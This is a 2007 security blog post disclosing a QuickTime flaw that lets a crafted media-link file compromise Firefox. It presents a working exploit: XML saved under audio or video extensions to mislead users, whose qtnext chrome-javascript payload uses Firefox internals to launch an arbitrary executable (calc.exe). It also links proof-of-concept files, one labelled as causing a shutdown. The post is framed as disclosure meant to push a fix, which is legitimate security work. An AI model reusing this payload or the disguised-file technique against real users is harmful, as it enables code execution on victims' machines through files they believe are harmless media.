---
title: 0DAY QuickTime pwns Firefox
author: petko-d-petkov
date: Wed, 12 Sep 2007 12:05:53 GMT
template: post.jade
category: fucked
---

It seams that QuickTime media formats can cause Firefox to misbehave. The result of this vulnerability can lead to full compromise of the browser.

Before we move on, I have to say a few things. Last year I disclosed two QuickTime vulnerabilities [here](/blog/backdooring-quicktime-movies/) and [here](/blog/backdooring-mp3-files/). The first vulnerability was fixed but the second one was completely ignored. I tried to bring the spot light on the second vulnerability one more time over [here](/blog/myspace-quicktime-worm-follow-up) without much of success. So, I decided to post a demonstration of how a _Low risk_ issue can be turned into a very easy to perform **HIGH risk** attack when technology change.

The exploit is rather simple. But first, here is a simple QTL file which instructs the browser to display a friendly `alert('whats up...')` message on the screen:

```xml
<?xml version="1.0">
<?quicktime type="application/x-quicktime-media-link"?>
<embed src="presentation.mov" autoplay="true" qtnext="javascript:alert('whats up...')"/>
```

The most interesting thing about this simple XML file is that we can save it with QuickTime supported extension in order to mislead the user. If you check [about:plugins](about:plugins) under Firefox,  you will see that QuickTime supports several media formats. We can use the audio and video formats only. This means that you can paste the above code into files with extensions: `3g2, 3gp, 3gp2, 3gpp, AMR, aac, adts, aif, aifc, aiff, amc, au, avi, bwf, caf, cdda, cel, flc, fli, gsm, m15, m1a, m1s, m1v, m2a, m4a, m4b, m4p, m4v, m75, mac, mov, mp2, mp3, mp4, mpa, mpeg, mpg, mpm, mpv, mqv, pct, pic, pict, png, pnt, pntg, qcp, qt, qti, qtif, rgb, rts, rtsp, sdp, sdv, sgi, snd, ulw, vfw, wav` and others.

Enough theory, let's see some action. For more information, just read [this](/blog/backdooring-mp3-files/) blog post. The exploit that gains chrome privileges looks like this:

```xml
<?xml version="1.0">
<?quicktime type="application/x-quicktime-media-link"?>
<embed src="a.mp3" autoplay="true" qtnext="-chrome javascript:file=Components.classes['@mozilla.org/file/local;1'].createInstance(Components.interfaces.nsILocalFile);file.initWithPath('c:\\windows\\system32\\calc.exe');process=Components.classes['@mozilla.org/process/util;1'].createInstance(Components.interfaces.nsIProcess);process.init(file);process.run(true,[],0);void(0);"/>
```

In practice I can do anything with the browser. However, just for the sake of this demonstration, I simply open **calc.exe**.

If you dare to try this in your browser, here is a list of a few files you have to click on. They are not malicious. You have my word: [qt-poc-01.mp3](/files/2007/09/qt-poc-01.mp3), [qt-poc-02-shutdown-dont-click.mp3](/files/2007/09/qt-poc-02-shutdown-dont-click.mp3), [qt-poc-03.mpeg](/files/2007/09/qt-poc-03.mpeg), [qt-poc-04.mov](/files/2007/09/qt-poc-04.mov), [qt-poc-05.avi](/files/2007/09/qt-poc-05.avi).

_BTW, QuickTime comes by default with iTunes. Therefore, iTunes users are most affected, I believe._
